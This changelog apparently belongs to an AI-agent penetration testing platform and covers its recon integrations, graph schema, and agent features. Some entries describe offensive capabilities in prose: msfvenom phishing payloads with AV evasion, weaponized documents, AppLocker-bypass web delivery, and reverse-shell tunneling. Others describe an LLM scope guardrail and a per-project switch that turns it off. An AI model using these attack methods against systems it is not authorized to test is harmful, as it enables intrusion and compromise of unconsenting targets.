- **URLScan.io OSINT Integration** — new passive enrichment module that queries URLScan.io's Search API to discover subdomains, IPs, TLS metadata, server technologies, domain age, and screenshots from historical scans. Runs in the recon pipeline after domain discovery, before port scanning. Full integration across the stack:
  - **New module**: `recon/urlscan_enrich.py` — fetches historical scan data from URLScan.io for each discovered domain. Works without API key (public results) or with API key (higher rate limits and access to private scans)
  - **Passive OSINT data**: discovers in-scope subdomains, IP addresses, URL paths for endpoint creation, TLS validity, ASN information, and external domains from historical scans
  - **GAU provider deduplication**: when URLScan enrichment has already run, the `urlscan` provider is automatically removed from GAU's data sources to avoid redundant API calls to the same underlying data
  - **Pipeline placement**: runs after domain discovery and before port scanning, alongside Shodan enrichment
  - **Project settings**: `urlscanEnabled` toggle and `urlscanMaxResults` (default: 500) configurable per project. Optional API key in Global Settings → API Keys
  - **Frontend**: new `UrlscanSection.tsx` in the Discovery & OSINT tab with passive badge, API key status indicator, and max results configuration

- **ExternalDomain Node** — new graph node type for tracking out-of-scope domains encountered during reconnaissance. Provides situational awareness about the target's external dependencies without scanning them:
  - **Schema**: `(:ExternalDomain { domain, sources[], redirect_from_urls[], redirect_to_urls[], status_codes_seen[], titles_seen[], servers_seen[], ips_seen[], countries_seen[], times_seen, first_seen_at, updated_at })`
  - **Relationship**: `(d:Domain)-[:HAS_EXTERNAL_DOMAIN]->(ed:ExternalDomain)`
  - **Multi-source aggregation**: external domains are collected from HTTP probe redirects, URLScan historical data, GAU passive archives, Katana crawling, and certificate transparency — then merged and deduplicated
  - **Neo4j constraints**: unique constraint on `(domain, user_id, project_id)` with tenant-scoped index
  - **Neo4j client**: new `update_graph_from_external_domains()` method for creating ExternalDomain nodes and HAS_EXTERNAL_DOMAIN relationships
  - **Graph schema docs**: `GRAPH.SCHEMA.md` updated with full ExternalDomain documentation

- **Subfinder Integration** — new passive subdomain discovery source in the recon pipeline. Queries 50+ online sources (certificate transparency, DNS databases, web archives, threat intelligence feeds) via ProjectDiscovery's Subfinder Docker image. No API keys required for basic operation (20+ free sources). Full multi-layer integration:
  - **Backend**: `run_subfinder()` in `domain_recon.py` using Docker-in-Docker pattern, JSONL parsing, max results capping
  - **Settings**: `subfinderEnabled` (default: true), `subfinderMaxResults` (default: 5000), `subfinderDockerImage` across Prisma schema, project settings, and defaults
  - **Frontend**: compact inline toggle with max results input in the Subdomain Discovery passive sources section
  - **Stealth mode**: max results capped to 100 (consistent with other passive sources)
  - **Entrypoint**: `projectdiscovery/subfinder:latest` added to Docker image pre-pull list
  - Results merge into existing subdomain flow — no graph schema changes needed

- **Puredns Wildcard Filtering** — new post-discovery validation step that removes wildcard DNS entries and DNS-poisoned subdomains before they reach the rest of the pipeline. Runs after the 5 discovery tools merge their results and before DNS resolution. Full multi-layer integration:
  - **Backend**: `run_puredns_resolve()` in `domain_recon.py` using Docker-in-Docker pattern with configurable threads, rate limiting, wildcard batch size, and skip-validation option
  - **Settings**: `purednsEnabled` (default: true), `purednsThreads` (default: 0 = auto), `purednsRateLimit` (default: 0 = unlimited), `purednsDockerImage` across Prisma schema, project settings, and defaults
  - **Frontend**: new "Wildcard Filtering" subsection with Active badge in the Subdomain Discovery section, with toggle and conditional thread/rate-limit inputs
  - **Stealth mode**: forced off (active DNS queries)
  - **RoE**: rate limit capped by global RoE max when enabled
  - **Entrypoint**: `frost19k/puredns:latest` added to Docker image pre-pull list, DNS resolver list auto-downloaded from trickest/resolvers (refreshed every 7 days)
  - **Graceful degradation**: on any error or timeout, returns the unfiltered subdomain list unchanged
  - **Orphan cleanup**: puredns image added to `SUB_CONTAINER_IMAGES` for force-stop container cleanup

- **Amass Integration** — OWASP Amass subdomain enumeration added to the recon pipeline as a new passive/active discovery source. Queries 50+ data sources (certificate transparency logs, DNS databases, web archives, WHOIS records) via the official Amass Docker image. Full multi-layer integration:
  - **Backend**: `run_amass()` in `domain_recon.py` using Docker-in-Docker pattern with configurable active mode, brute force, timeout, and max results capping
  - **Settings**: `amassEnabled` (default: false), `amassMaxResults` (default: 5000), `amassTimeout` (default: 10 min), `amassActive` (default: false), `amassBrute` (default: false), `amassDockerImage` across Prisma schema, project settings, and defaults
  - **Frontend**: compact inline toggle with max results input in the passive sources section, plus dedicated Amass Active Mode and Amass Bruteforce toggles in the active discovery section with time estimate warning
  - **Stealth mode**: active and brute force forced off, max results capped to 100
  - **Entrypoint**: `caffix/amass:latest` added to Docker image pre-pull list
  - Results merge into existing subdomain flow with per-source attribution — no graph schema changes needed

- **Parallelized Recon Pipeline (Fan-Out / Fan-In)** — the reconnaissance pipeline now uses `concurrent.futures.ThreadPoolExecutor` to run independent modules concurrently, significantly reducing total scan time while respecting data dependencies between groups:
  - **GROUP 1**: WHOIS + Subdomain Discovery + URLScan run in parallel (3 concurrent tasks). Within subdomain discovery, all 5 tools (crt.sh, HackerTarget, Subfinder, Amass, Knockpy) run concurrently via `ThreadPoolExecutor(max_workers=5)`. Each tool refactored into a thread-safe function with its own `requests.Session`
  - **GROUP 3**: Shodan Enrichment + Port Scan (Naabu) run in parallel (2 concurrent tasks). New `_isolated` function variants (`run_port_scan_isolated`, `run_shodan_enrichment_isolated`) accept a read-only snapshot and return only their data section
  - **DNS Resolution**: parallelized with 20 concurrent workers via `ThreadPoolExecutor(max_workers=20)` in `resolve_all_dns()`
  - **Background Graph DB Updates**: all Neo4j graph writes now run in a dedicated single-writer background thread (`_graph_update_bg`). The main pipeline submits deep-copy snapshots and continues immediately. `_graph_wait_all()` ensures completion before pipeline exit
  - **Structured Logging**: all log messages standardized to `[level][Module]` prefix format (e.g., `[+][crt.sh] Found 42 subdomains`) for clarity in concurrent output
  - Resource Enumeration (Katana, GAU, Kiterunner) was already internally parallel; Groups 4 (HTTP Probe) and 6 (Vuln Scan + MITRE) remain sequential as they depend on prior group results

- **Per-source Subdomain Attribution** — subdomain discovery now tracks which tool found each subdomain (crt.sh, hackertarget, subfinder, amass, knockpy). External domain entries carry accurate per-source labels instead of generic `cert_discovery`. `get_passive_subdomains()` returns `dict{subdomain: set_of_sources}` instead of a flat set

- **Compact Subdomain Discovery UI** — passive subdomain source toggles (crt.sh, HackerTarget, Subfinder, Amass, Knockpy) now display the tool name, max results input, and toggle on a single row instead of separate expandable sections

- **Discovery & OSINT Tab** — new unified tab in the project form replacing the previous scattered tool placement. Groups all passive and active discovery tools in a single section:
  - **Subdomain Discovery** — passive sources (crt.sh, HackerTarget, Subfinder, Amass, Knockpy Recon) and active discovery (Knockpy Bruteforce, Amass Active/Brute), plus DNS settings (WHOIS/DNS retries)
  - **Shodan OSINT Enrichment** — moved from the Integrations tab into Discovery & OSINT, reflecting its role as a core discovery tool rather than an external integration. All four toggles (Host Lookup, Reverse DNS, Domain DNS, Passive CVEs) remain unchanged
  - **URLScan.io Enrichment** — new section with passive badge, max results config, and API key status
  - **Node Info Tooltips** — each section header now has a waypoints icon that shows which graph node types the tool **consumes** (input, blue pills) and **produces** (output, purple pills) via `NodeInfoTooltip` component, `SECTION_INPUT_MAP` and `SECTION_NODE_MAP` in `nodeMapping.ts`
  - Recon toggle switches moved to section headers for cleaner layout

- **Agent Guardrail Toggle** — the scope guardrail (LLM-based target verification) can now be enabled or disabled per project:
  - **New setting**: `agentGuardrailEnabled` (default: `true`) — when disabled, the agent skips the scope verification check on session start
  - **Initialize node**: guardrail check is now conditional, skipped when setting is false or on retries to avoid redundant LLM calls
  - **Think node**: scope guardrail reminder in the system prompt only injected when enabled
  - **Guardrail LLM bootstrapping**: the guardrail API endpoint now fetches the user's configured LLM providers from the database to properly initialize the LLM with the correct API keys (OpenAI, Anthropic, or OpenRouter)
  - **Frontend**: checkbox in Agent Behaviour section
  - **Fail-closed**: if the guardrail check itself fails (API error, LLM error), the agent is blocked by default (security-first)

- **Multi-source CVE Attribution** — CVE nodes created from Shodan data now track their source (`source` property) instead of hardcoding "shodan", enabling future enrichment from multiple CVE databases (NVD, Vulners, etc.)

- **API Key Rotation** — configure multiple API keys per tool with automatic round-robin rotation to avoid rate limits. Each key in Global Settings now has a "Key Rotation" button that opens a modal to add extra keys and set the rotation interval (default: every 10 API calls). All keys (main + extras) are treated equally in the rotation pool. Full multi-layer integration:
  - **Database**: new `ApiKeyRotationConfig` model with `userId + toolName` unique constraint, `extraKeys` (newline-separated), and `rotateEveryN` (default 10)
  - **Settings API**: `GET /api/users/[id]/settings` returns `rotationConfigs` with key counts (frontend) or full keys (`?internal=true`); `PUT` accepts rotation config upserts with masked-value preservation
  - **Frontend**: "Key Rotation" button next to each API key field; modal with textarea for extra keys (one per line) and rotation interval input; info badge showing total key count and rotation interval when configured
  - **Python KeyRotator**: pure-Python round-robin class (`key_rotation.py`) in both `agentic/` and `recon/` containers — no new dependencies, no Docker image rebuild needed
  - **Agent integration**: orchestrator builds `KeyRotator` per tool manager; `web_search`, `shodan`, and `google_dork` tools use `rotator.current_key` + `tick()` on each API call
  - **Recon integration**: single `_fetch_user_settings_full()` call replaces individual key fetches; rotators built for Shodan, URLScan, NVD, and Vulners; threaded through `_shodan_get`, `_urlscan_search`, `lookup_cves_nvd`, and `lookup_cves_vulners`
  - **Backward compatible**: with no extra keys configured, behavior is identical to before
  - **Tests**: 26 unit tests covering KeyRotator logic, rotation mechanics, integration with Shodan/URLScan/NVD/Vulners enrichment modules

- **NVD/Vulners API Keys moved to Global Settings** — NVD and Vulners API keys removed from the Project model and the project-level fallback chain. All 6 tool API keys (Tavily, Shodan, SerpAPI, NVD, Vulners, URLScan) are now exclusively user-scoped in Global Settings, consistent with the other keys.

### Fixed

- **Banner grabbing data loss** — fixed falsy value filtering in `neo4j_client.py` banner property handling. Changed `if v` to `if v is not None` to preserve empty strings and zero values that are valid banner data

### Changed

- Kali sandbox Dockerfile updated
- Shodan OSINT Enrichment moved from the Integrations tab to the new Discovery & OSINT tab in the project form
- Integrations tab now contains only GitHub Secret Hunting (Shodan removed)
- Recon pipeline toggle switches moved from section bodies to section headers for a cleaner UI
- Documentation and wiki updates

---

## [2.3.0] - 2026-03-14

### Added

- **Global Settings Page** — new `/settings` page (gear icon in header) for managing all user-level configuration through the UI. AI provider keys and Tavily API key are configured exclusively here — no `.env` file needed. Two sections:
  - **LLM Providers** — add, edit, delete, and test LLM provider configurations stored per-user in the database. Supports five provider types:
    - **OpenAI, Anthropic, OpenRouter** — enter API key, all models auto-discovered
    - **AWS Bedrock** — enter AWS credentials + region, foundation models auto-discovered
    - **OpenAI-Compatible** — single endpoint+model configuration with presets for Ollama, vLLM, LM Studio, Groq, Together AI, Fireworks AI, Mistral AI, and Deepinfra. Supports custom base URL, headers, timeout, temperature, and max tokens
  - **API Keys** — Tavily API key (web search), Shodan API key (internet-wide OSINT), and SerpAPI key (Google dorking)
- **Test Connection** — each LLM provider can be tested before saving with a "Test Connection" button that sends a simple message and shows the response
- **DB-only settings** — AI provider keys and Tavily API key are stored exclusively in the database (per-user). No env-var fallback — `.env` is reserved for infrastructure variables only (NVD, tunneling, database credentials, ports)
- **Prisma schema** — added `UserLlmProvider` and `UserSettings` models with relations to `User`
- **Centralized LLM setup** — CypherFix triage and codefix orchestrators now use the shared `setup_llm()` function instead of duplicating provider routing logic

- **Pentest Report Generation** — generate professional, client-ready penetration testing reports as self-contained HTML files from the `/reports` page. Reports compile all reconnaissance data, vulnerability findings, CVE intelligence, attack chain results, and remediation recommendations into an 11-section document (Cover, Executive Summary, Scope & Methodology, Risk Summary, Findings, Other Vulnerability Details, Attack Surface, CVE Intelligence, GitHub Secrets, Attack Chains, Recommendations, Appendix). Features include:
  - **LLM-generated narratives** — when an AI model is configured, six report sections receive detailed prose: executive summary (8–12 paragraphs), scope, risk analysis, findings context, attack surface analysis, and exhaustive prioritized remediation triage. Falls back gracefully to data-only reports when no LLM is available
  - **Security Posture Radar** — inline SVG 6-axis radar chart in the Risk Summary section showing Attack Surface, Vulnerability Density, Exploitability, Certificate Health, Injectable Parameters, and Security Header coverage using logarithmic normalization
  - **Security Headers Gap Analysis** — per-header weighted coverage bars (HSTS, CSP, X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, Referrer-Policy, Permissions-Policy) with color-coded thresholds
  - **CISA KEV Callout** — prominent alert box highlighting Known Exploited Vulnerabilities when present
  - **Injectable Parameters Breakdown** — summary and per-position injection risk analysis with visual bars
  - **Attack Flow Chains** — Technology → CVE → CWE → CAPEC flow table showing complete attack paths
  - **CDN Coverage visualization** — ratio of CDN-fronted vs directly exposed IPs in the Attack Surface section
  - **Project-specific generation** — dedicated project selector dropdown on the reports page (independent of the top bar selection)
  - **Download and Open** — separate buttons to save the HTML file locally or open in a new browser tab
  - **Print/PDF optimized** — page breaks, print-friendly CSS, and clean SVG/CSS bar rendering for `Ctrl+P` export
  - **Export/Import support** — reports (metadata + HTML files) are included in project export ZIP archives and fully restored on import
  - **Wiki documentation** — new [Pentest Reports](redamon.wiki/20.-Pentest-Reports) wiki page with example report download

- **Target Guardrail** — LLM-based safety check that prevents targeting unauthorized domains and IPs. Blocks government sites (`.gov`, `.mil`), major tech companies, financial institutions, social media platforms, and other well-known public services. Two layers: project creation (fail-open) and agent initialization (fail-closed). For IP mode, public IPs are resolved via reverse DNS before evaluation; private/RFC1918 IPs are auto-allowed. Blocked targets show a centered modal with the reason.

- **Expanded CPE Technology Mappings** — CPE_MAPPINGS table in `recon/helpers/cve_helpers.py` expanded from 82 to 133 entries, significantly improving CVE lookup accuracy for Wappalyzer-detected technologies. New coverage includes:
  - **CMS**: Magento, Ghost, TYPO3, Concrete CMS, Craft CMS, Strapi, Umbraco, Adobe Experience Manager, Sitecore, DNN, Kentico
  - **Web Frameworks**: CodeIgniter, Symfony, CakePHP, Yii, Nuxt.js, Apache Struts, Adobe ColdFusion
  - **JavaScript Libraries**: Moment.js, Lodash, Handlebars, Ember.js, Backbone.js, Dojo, CKEditor, TinyMCE, Prototype
  - **E-commerce**: PrestaShop, OpenCart, osCommerce, Zen Cart, WooCommerce
  - **Message Boards / Community**: Discourse, phpBB, vBulletin, MyBB, Flarum, NodeBB, Mastodon, Mattermost
  - **Wikis**: MediaWiki, Atlassian Confluence, DokuWiki, XWiki
  - **Issue Trackers / DevOps**: Atlassian Jira, Atlassian Bitbucket, Bugzilla, Redmine, Gitea, TeamCity, Artifactory
  - **Hosting Panels**: cPanel, Plesk, DirectAdmin
  - **Web Servers**: OpenResty, Deno, Tengine
  - **Databases**: SQLite, Apache Solr, Adminer
  - **Security / Network**: Kong, F5 BIG-IP, Pulse Secure
  - **Webmail**: Zimbra, SquirrelMail
  - 29 new `normalize_product_name()` aliases for Wappalyzer output variations (e.g., "Atlassian Jira" → "jira", "Moment" → "moment.js", "Concrete5" → "concrete cms")
  - 6 new `skip_list` entries (Cloudflare, Google Analytics, Google Tag Manager, Facebook Pixel, Hotjar, Google Font API) to avoid wasting NVD API calls on SaaS/CDN technologies

- **Insights Dashboard** — Real-time analytics page (`/insights`) with interactive charts and tables covering attack chains, exploit successes, finding severity, targets attacked, strategic decisions, vulnerability distributions, attack surface composition, and agent activity. All data is pulled directly from the Neo4j graph and organized into sections: Attack Chains & Exploits, Attack Surface, Vulnerabilities & CVE Intelligence, Graph Overview, and Activity & Timeline.

- **Rules of Engagement (RoE)** — upload a RoE document (PDF, TXT, MD, DOCX) at project creation and an LLM auto-parses it into structured settings enforced across the entire platform:
  - **Document upload & parsing** — file upload area in the RoE tab of the project form (create mode only). The agent extracts client info, scope, exclusions, time windows, testing permissions, rate limits, data handling policies, compliance frameworks, and more into 30+ structured fields
  - **Three enforcement layers** — (1) agent prompt injection: structured `RULES OF ENGAGEMENT (MANDATORY)` section injected into every reasoning step with excluded hosts, permissions, and constraints; (2) hard gate in `execute_tool_node`: deterministic code blocks forbidden tools, forbidden categories, permission flags, and phase cap violations regardless of LLM output; (3) recon pipeline: excluded hosts filtered from target lists, rate limits capped via `min(tool_rate, global_max)`, time window blocks scan starts outside allowed hours
  - **30+ RoE project fields** — client & engagement info, excluded hosts with reasons, time windows (days/hours/timezone), 6 testing permission toggles (DoS, social engineering, physical access, data exfiltration, account lockout, production testing), forbidden tool/category lists, max severity phase cap, global rate limit, sensitive data handling policy, data retention, encryption requirements, status update frequency, critical finding notification, incident procedure, compliance frameworks, third-party providers, and free-text notes
  - **RoE Viewer tab** on the graph dashboard — formatted read-only view with cards for engagement, scope, exclusions, time window (live ACTIVE/OUTSIDE WINDOW status), testing permissions (green/red badge grid), constraints, data handling, communication, compliance, and notes. Download button for the original uploaded document
  - **RoE toolbar badge** — blue "RoE" badge on the graph toolbar when engagement guardrails are active
  - **Smart tool restriction parsing** — only explicitly banned tools (e.g., "do not use Hydra") are disabled; "discouraged" or "use with caution" language is noted in the prompt but does not disable tools. Phase restrictions use `roeMaxSeverityPhase` instead of stripping phases from individual tools
  - **Export/import support** — RoE document binary is base64-encoded in project exports and restored on import. All RoE fields are included in the export ZIP
  - **Cascade deletion** — all RoE data (fields + document binary) deleted with the project via Prisma cascade
  - One-way at creation only — RoE settings become read-only after project creation to prevent mid-engagement modification
  - Based on industry standards: PTES, SANS, NIST SP 800-115, Microsoft RoE, HackerOne, Red Team Guide

- **Emergency PAUSE ALL button** — red/yellow danger-styled button on the Graph toolbar that instantly freezes every running pipeline (Recon, GVM, GitHub Hunt) and stops all AI agent conversations in one click. Shows "PAUSING..." with spinner during operation. Always visible on the toolbar, disabled when nothing is running. New `POST /emergency-stop-all` endpoint on the agent service cancels all active agent tasks via the WebSocket manager

- **Wave Runner (Parallel Tool Plans)** — when the LLM identifies two or more independent tools that don't depend on each other's outputs, it groups them into a **wave** and executes them concurrently via `asyncio.gather()` instead of sequentially. Key components:
  - **New LLM action**: `plan_tools` alongside `use_tool` — the LLM emits a `ToolPlan` with multiple `ToolPlanStep` entries and a plan rationale
  - **New LangGraph node**: `execute_plan` runs all steps in parallel, each with its own RoE gate check, tool_start/tool_complete streaming, and progress updates
  - **Combined wave analysis**: after all tools finish, the think node analyzes all outputs together in a single LLM call, producing consolidated findings and next steps
  - **Three new WebSocket events**: `plan_start` (wave begins with tool list), `plan_complete` (success/failure counts), `plan_analysis` (LLM interpretation). Existing `tool_start`, `tool_output_chunk`, and `tool_complete` events carry an optional `wave_id` to group tools within a wave
  - **Frontend PlanWaveCard**: grouped card in AgentTimeline showing all wave tools nested together with status badge (Running/Success/Partial/Error), plan rationale, combined analysis, actionable findings, and recommended next steps
  - **State management**: new `ToolPlan` and `ToolPlanStep` Pydantic models, `_current_plan` field in `AgentState`
  - **Graceful fallback**: empty `tool_plan` objects or plans with no steps are automatically downgraded to sequential `use_tool` execution

- **Agent Skills System** — modular attack path management with built-in and user-uploaded skills:
  - **Built-in Agent Skills** — four core skills (CVE (MSF), Credential Testing, Social Engineering Simulation, Availability Testing) can now be individually enabled or disabled per project via toggles in the new Agent Skills section of Project Settings. Disabling a skill prevents the agent from classifying requests into that attack type and removes its prompts from the system prompt. Sub-settings (Hydra config, SMTP config, DoS parameters) are shown inline when the corresponding skill is enabled
  - **User Agent Skills** — upload custom `.md` files defining attack workflows from Global Settings. Each skill file contains a full workflow description that the agent follows across all three phases (informational, exploitation, post-exploitation). User skills are stored per-user in the database (`UserAttackSkill` model) and become available as toggles in all project settings
  - **Skill Management in Global Settings** — dedicated "Agent Skills" section with upload button (accepts `.md` files, max 50KB), skill list with download and delete actions, and a name-entry modal on upload
  - **Per-project skill toggles** — `attackSkillConfig` JSON field in the project stores `{ builtIn: { skill_id: bool }, user: { skill_id: bool } }` controlling which skills are active. Built-in skills default to enabled; user skills default to enabled when present
  - **Agent integration** — LLM classifier routes requests to user skills via `user_skill:<id>` attack path type. Skill `.md` content is injected into the system prompt for all three phases with phase-appropriate guidance. Falls back to unclassified workflow if skill content is missing
  - **API endpoints** — `GET/POST /api/users/[id]/attack-skills` (list/create), `GET/DELETE /api/users/[id]/attack-skills/[skillId]` (read/delete), `GET /api/users/[id]/attack-skills/available` (with content for agent consumption)
  - Max 20 skills per user, 50KB per skill file

- **Kali Shell — Library Installation Control** — new prompt-based setting in Agent Behaviour to control whether the agent can install packages via `pip install` or `apt install` in `kali_shell` during a pentest:
  - **Toggle**: "Allow Library Installation" — when disabled (default), the system prompt instructs the agent to only use pre-installed tools and libraries. When enabled, the agent may install packages as needed for specific attacks
  - **Authorized Packages (whitelist)** — comma-separated list. When non-empty, only these packages may be installed; the agent is instructed not to install anything outside the list
  - **Forbidden Packages (blacklist)** — comma-separated list. These packages must never be installed, regardless of the whitelist
  - Installed packages are ephemeral — lost on container restart. Prompt-based control only (no server-side enforcement)
  - Conditional UI: whitelist and blacklist textareas only appear when the toggle is enabled
  - `build_kali_install_prompt()` dynamically generates the installation rules section, injected into the system prompt whenever `kali_shell` is in the allowed tools for the current phase

- **Shodan OSINT Integration** — full Shodan integration at two levels: automated recon pipeline and interactive AI agent tool:
  - **Pipeline enrichment** — new `recon/shodan_enrich.py` module runs after domain/IP discovery, before port scanning. Four independently toggled features: Host Lookup (IP geolocation, OS, ISP, open ports, services, banners), Reverse DNS (hostname discovery), Domain DNS (subdomain enumeration + DNS records, paid plan), and Passive CVEs (extract known CVEs from host data)
  - **InternetDB fallback** — when the Shodan API returns 403 (free key), host lookup and reverse DNS automatically fall back to Shodan's free InternetDB API (`internetdb.shodan.io`) which provides ports, hostnames, CPEs, CVEs, and tags without requiring a paid plan
  - **Graph database ingestion** — `update_graph_from_shodan()` in `neo4j_client.py` creates/updates IP nodes (os, isp, org, country, city), Port + Service nodes, Subdomain nodes from reverse DNS, DNSRecord nodes from domain DNS, and Vulnerability + CVE nodes from passive CVEs — all using MERGE for deduplication with existing pipeline data
  - **Agent tool** — unified `shodan` tool with 5 actions: `search` (device search, paid key), `host` (detailed IP info), `dns_reverse` (reverse DNS), `dns_domain` (DNS records + subdomains, paid key), and `count` (host count without search credits). Available in all agent phases
  - **Project settings** — 4 pipeline toggles in the Integrations tab (`ShodanSection.tsx`): Host Lookup, Reverse DNS, Domain DNS, Passive CVEs. Toggles are disabled with a warning banner when no Shodan API key is configured in Global Settings
  - **Graceful error handling** — `ShodanApiKeyError` exception for immediate abort on invalid keys (401); per-function 403 handling with InternetDB fallback; pipeline continues even if Shodan enrichment fails entirely

- **Google Dork Tool (SerpAPI)** — new `google_dork` agent tool for passive OSINT via Google advanced search operators. Uses the SerpAPI Google engine to find exposed files (`filetype:sql`, `filetype:env`), admin panels (`inurl:admin`), directory listings (`intitle:"index of"`), and sensitive data leaks (`intext:password`). Returns up to 10 results with titles, URLs, snippets, and total result count. SerpAPI key configured in Global Settings. No packets are sent to the target — purely passive reconnaissance

- **Deep Think (Strategic Reasoning)** — automatic strategic analysis at key decision points during agent operation. Triggers on: first iteration (initial strategy), phase transitions (re-evaluation), failure loops (3+ consecutive failures trigger pivot), and agent self-request (when stuck or going in circles). Produces structured JSON analysis with situation assessment, identified attack vectors, recommended approach with rationale, priority-ordered action steps, and risk mitigations. The analysis is injected into subsequent reasoning steps to guide the agent's strategy:
  - **Toggle**: `DEEP_THINK_ENABLED` in Agent Behaviour settings (default: off)
  - **Self-request**: agent can set `"need_deep_think": true` in its output to trigger a strategic re-evaluation on the next iteration
  - **Frontend card**: `DeepThinkCard` in the Agent Timeline displays the analysis with trigger reason, situation assessment, attack vectors, recommended approach, priority steps, and risks — collapsible with a lightbulb icon
  - **WebSocket event**: `deep_think` event streams the analysis result to the frontend in real-time

- **Inline Agent Settings** — Agent Behaviour, Tool Matrix, and Agent Skills sections are now accessible directly from the AI Assistant drawer via a gear icon in the toolbar. Opens a modal overlay for quick configuration changes without navigating away from the graph page. Changes are saved to the project and take effect on the next agent iteration

- **Inline API Key Configuration** — when an agent tool is unavailable due to a missing API key (web_search, shodan, google_dork), the AI Assistant drawer shows a warning badge with a one-click modal to enter the key directly. No need to navigate to Global Settings

- **Tool Registry Overhaul** — compressed and restructured the agent's tool registry descriptions for all tools (query_graph, web_search, shodan, google_dork, curl, nmap, kali_shell, hydra, metasploit_command). Descriptions are more concise with inline argument formats and usage examples, reducing prompt token usage while maintaining clarity

### Fixed

- **Project export/import missing Remediations** — The `Remediation` table (CypherFix vulnerability remediations, code fixes, GitHub PR integrations, file changes) was not included in project export/import. Exports now include `remediations/remediations.json` in the ZIP archive, and imports restore all remediation records under the new project. Backward-compatible with older exports that lack the remediations file.

### Changed

- **Docker CLI upgrade in recon container** — Replaced Debian's `docker.io` package with `docker-ce-cli` from Docker's official APT repository. Fixes compatibility issues with newer host Docker daemons (closes #30, based on #35). Only the CLI is installed — no full engine, containerd, or compose plugins.

---

## [2.2.0] - 2026-03-05

### Added

- **Pipeline Pause / Resume / Stop Controls** — full lifecycle management for all three pipelines (Recon, GVM Scan, GitHub Secret Hunt):
  - **Pause** — freezes the running container via Docker cgroups (`container.pause()`). Zero changes to scan scripts; processes resume exactly where they left off
  - **Resume** — unfreezes the container (`container.unpause()`), logs resume streaming instantly
  - **Stop** — kills the container permanently. Paused containers are unpaused before stopping to avoid cgroup issues. Sub-containers (naabu, httpx, nuclei, etc.) are also cleaned up
  - **Toolbar UI** — when running: spinner + Pause button + Stop button. When paused: Resume button + Stop button. When stopping: "Stopping..." with disabled controls
  - **Logs drawer controls** — pause/resume and stop buttons in the status bar, with `Paused` status indicator and spinner during stopping
  - **Optimistic UI** — stop button immediately shows "Stopping..." before the API responds
  - **SSE stays alive** during pause and stopping states so logs resume/complete without reconnection
  - 6 new backend endpoints (`POST /{recon,gvm,github-hunt}/{projectId}/{pause,resume}`) and 9 new webapp API proxy routes (pause/resume/stop × 3 pipelines)
  - Removed the auto-scroll play/pause toggle from logs drawer (redundant with "Scroll to bottom" button)
- **IP/CIDR Targeting Mode** — start reconnaissance from IP addresses or CIDR ranges instead of a domain:
  - **"Start from IP" toggle** in the Target & Modules tab — switches the project from domain-based to IP-based targeting. Locked after creation (cannot switch modes on existing projects)
  - **Target IPs / CIDRs textarea** — accepts individual IPs (`192.168.1.1`), IPv6 (`2001:db8::1`), and CIDR ranges (`10.0.0.0/24`, `192.168.1.0/28`) with a max /24 (256 hosts) limit per CIDR
  - **Reverse DNS (PTR) resolution** — each IP is resolved to its hostname via PTR records. When no PTR exists, a mock hostname is generated from the IP (e.g., `192-168-1-1`)
  - **CIDR expansion** — CIDR ranges are automatically expanded into individual host IPs (network and broadcast addresses excluded). Original CIDRs are passed to naabu for efficient native scanning
  - **Full pipeline support** — IP-mode projects run the complete 6-phase pipeline: reverse DNS + IP WHOIS → port scan → HTTP probe → resource enumeration (Katana, Kiterunner) → vulnerability scan (Nuclei) → CVE/MITRE enrichment
  - **Neo4j graph integration** — mock Domain node (`ip-targets.{project_id}`) with `ip_mode: true`, Subdomain nodes (real PTR hostnames or IP-based mocks), IP nodes with WHOIS data, and all downstream relationships
  - **Tenant-scoped Neo4j constraints** — IP, Subdomain, BaseURL, Port, Service, and Technology uniqueness constraints are now scoped to `(key, user_id, project_id)`, allowing the same IP/subdomain to exist in different projects without conflicts
  - **Input validation** — new `webapp/src/lib/validation.ts` module with regex validators for IPs, CIDRs, domains, ports, status codes, HTTP headers, GitHub tokens, and more. Validation runs on form submit
  - `ipMode` and `targetIps` fields added to Prisma schema with database migration
- **Chisel TCP Tunnel Integration** — multi-port reverse tunnel alternative to ngrok for full attack path support:
  - chisel (v1.11.4) installed alongside ngrok in kali-sandbox Dockerfile — single binary, supports amd64 and arm64
  - Reverse tunnels both port 4444 (handler) and port 8080 (web delivery/HTA) through a single connection to a VPS
  - Enables **Web Delivery** (Method C) and **HTA Delivery** (Method D) phishing attacks that require two ports — previously blocked with ngrok's single-port limitation
  - **Stageless** Meterpreter payloads required through chisel (staged payloads fail through tunnels — same as ngrok)
  - Deterministic endpoint discovery — LHOST derived from `CHISEL_SERVER_URL` hostname (no API polling needed)
  - Auto-reconnect with exponential backoff if VPS connection drops
  - `CHISEL_SERVER_URL` and `CHISEL_AUTH` env vars added to `.env.example` and `docker-compose.yml`
  - `_query_chisel_tunnel()` utility in `agentic/utils.py` with `get_session_config_prompt()` integration
  - `agentChiselTunnelEnabled` Prisma field with database migration
- **Social Engineering Simulation Attack Path** (`phishing_social_engineering`) — third classified attack path with a mandatory 6-step workflow: target platform selection, handler setup, payload generation, verification, delivery, and session callback:
  - **Standalone Payloads** (Method A): msfvenom-based payload generation for Windows (exe, psh, psh-reflection, vba, hta-psh), Linux (elf, bash, python), macOS (macho), Android (apk), Java (war), and cross-platform (python) — with optional AV evasion via shikata_ga_nai encoding
  - **Malicious Documents** (Method B): Metasploit fileformat modules for weaponized Word macro (.docm), Excel macro (.xlsm), PDF (Adobe Reader exploit), RTF (CVE-2017-0199 HTA handler), and LNK shortcut files
  - **Web Delivery** (Method C): fileless one-liner delivery via `exploit/multi/script/web_delivery` supporting Python, PHP, PowerShell, Regsvr32 (AppLocker bypass), pubprn, SyncAppvPublishingServer, and PSH Binary targets
  - **HTA Delivery** (Method D): HTML Application server via `exploit/windows/misc/hta_server` for browser-based payload delivery
  - **Email Delivery**: Python smtplib-based email sending via `execute_code` with per-project SMTP configuration (host, port, user, password, sender, TLS) — agent asks at runtime if no SMTP settings are configured
  - **Chat Download**: default delivery via `docker cp` command reported in chat
  - New prompt module `phishing_social_engineering_prompts.py` with `PHISHING_SOCIAL_ENGINEERING_TOOLS` (full workflow) and `PHISHING_PAYLOAD_FORMAT_GUIDANCE` (OS-specific format decision tree and msfvenom quick reference)
  - LLM classifier updated with phishing keywords and 10 example requests for accurate routing
  - `phishing_social_engineering` added to `KNOWN_ATTACK_PATHS` set and `AttackPathClassification` validator
- **ngrok TCP Tunnel Integration** — automatic reverse shell tunneling through ngrok for NAT/cloud environments:
  - ngrok installed in kali-sandbox Dockerfile and auto-started in `entrypoint.sh` when `NGROK_AUTHTOKEN` env var is set
